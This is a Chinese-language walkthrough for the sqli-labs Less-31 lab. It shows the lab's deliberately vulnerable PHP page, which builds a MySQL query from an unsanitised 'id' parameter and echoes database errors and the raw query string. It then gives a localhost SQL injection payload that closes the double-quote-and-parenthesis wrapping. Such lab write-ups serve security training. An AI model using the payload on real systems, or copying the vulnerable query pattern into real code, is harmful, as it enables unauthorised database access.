### 三十一关解法 ###
首先看三十一关代码
```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-31 FUN with WAF</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:70px;color:#FFF; font-size:40px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">


<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");

// take the variables 
if(isset($_GET['id'])) /*如果$_GET[id]存在则执行以下*/
{
	$id=$_GET['id'];
	//logging the connection parameters to a file for analysis.
	$fp=fopen('result.txt','a');
	fwrite($fp,'ID:'.$id."\n");
	fclose($fp);

	$qs = $_SERVER['QUERY_STRING']; /*query string（查询字符串），如果有的话，通过它进行页面访问*/
	$hint=$qs;
	$id = '"'.$id.'"';

// connectivity 
	$sql="SELECT * FROM users WHERE id= ($id) LIMIT 0,1";
	$result=mysql_query($sql);
	$row = mysql_fetch_array($result);
	if($row)
	{
	  	echo "<font size='5' color= '#99FF00'>";	
	  	echo 'Your Login name:'. $row['username'];
	  	echo "<br>";
	  	echo 'Your Password:' .$row['password'];
	  	echo "</font>";
  	}
	else 
	{
		echo '<font color= "#FFFF00">';
		print_r(mysql_error());
		echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}






?>
</font> </div></br></br></br><center>
<img src="../images/Less-31.jpg" />
</br>
</br>
</br>
<img src="../images/Less-31-1.jpg" />
</br>
</br>
<font size='4' color= "#33FFFF">
<?php
echo "Hint: The Query String you input is: ".$hint;
?>
</font> 
</center>
</body>
</html>
```
可以看到在带入数据库查询之前，这个在前后加了个双引号。闭合就是
得出的payload
```
http://127.0.0.1/sqli-labs-master/Less-31/?id=1") and 1=2 |("
```
![k1yyoq.md.png](https://s2.ax1x.com/2019/01/31/k1yyoq.md.png)